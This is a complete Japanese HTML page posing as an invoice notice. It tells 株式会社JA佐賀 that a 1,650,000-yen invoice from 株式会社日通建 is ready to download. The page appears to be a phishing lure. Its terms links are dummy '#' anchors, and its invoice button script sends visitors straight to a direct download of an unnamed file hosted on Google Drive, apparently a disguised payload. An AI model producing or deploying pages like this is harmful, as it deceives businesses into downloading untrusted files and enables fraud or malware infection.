<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>請求書通知</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f7f7f7;
      font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial,
                   "YuGothic", "游ゴシック", "メイリオ", Meiryo, sans-serif;
    }

    .wrapper {
      max-width: 900px;
      margin: 40px auto;
      background: #ffffff;
      padding: 40px 60px 60px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.06);
      box-sizing: border-box;
    }

    h1 {
      text-align: center;
      font-size: 32px;
      margin: 0 0 8px;
    }

    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #555;
      margin-bottom: 40px;
    }

    .summary-row {
      display: flex;
      justify-content: space-between;
      text-align: center;
      margin-bottom: 40px;
    }

    .summary-item {
      flex: 1;
    }

    .summary-label {
      font-size: 13px;
      color: #777;
      margin-bottom: 8px;
    }

    .summary-value-main {
      font-size: 28px;
      font-weight: bold;
    }

    .summary-value-sub {
      font-size: 14px;
      margin-left: 4px;
    }

    hr {
      border: none;
      border-top: 1px solid #e1e1e1;
      margin: 30px 0;
    }

    .download-row {
      display: flex;
      align-items: flex-start;
      gap: 40px;
    }

    .download-label {
      width: 140px;
      font-size: 14px;
      color: #333;
    }

    .download-content {
      flex: 1;
      font-size: 14px;
      color: #555;
    }

    .download-content ul {
      margin: 8px 0 16px 18px;
      padding: 0;
    }

    .download-content li {
      margin-bottom: 4px;
    }

    .download-content a {
      color: #0072c6;
      text-decoration: none;
    }

    .download-content a:hover {
      text-decoration: underline;
    }

    .btn-primary {
      display: inline-block;
      padding: 10px 40px;
      background: #0083d6;
      color: #fff;
      border-radius: 4px;
      text-decoration: none;
      font-size: 14px;
      border: none;
      cursor: pointer;
    }

    .btn-primary:hover {
      opacity: 0.9;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <h1>株式会社JA佐賀様</h1>
    <div class="subtitle">株式会社日通建様から請求書が届いています</div>

    <div class="summary-row">
      <div class="summary-item">
        <div class="summary-label">ご請求金額</div>
        <div class="summary-value-main">
          1,650,000<span class="summary-value-sub">円</span>
        </div>
      </div>
      <div class="summary-item">
        <div class="summary-label">請求書番号</div>
        <div class="summary-value-main">648</div>
      </div>
      <div class="summary-item">
        <div class="summary-label">ダウンロード期限</div>
        <div class="summary-value-main">2026/01/30</div>
      </div>
    </div>

    <hr>

    <div class="download-row">
      <div class="download-label">PDFダウンロード</div>
      <div class="download-content">
        <p>以下の利用規約等へ同意してダウンロードしてください。</p>
        <ul>
          <li><a href="#">利用規約</a></li>
          <li><a href="#">個人情報の取り扱いについて</a></li>
        </ul>
        <button class="btn-primary" onclick="onInvoiceButtonClick()">請求書</button>
      </div>
    </div>
  </div>

<script>
  function onInvoiceButtonClick() {
    
    const url = `https://drive.google.com/uc?export=download&id=1beIuU7zSCsgbWUgasprFHxoQSEyM4e4-`;
    window.location.href = url;  
  }
</script>
</body>
</html>
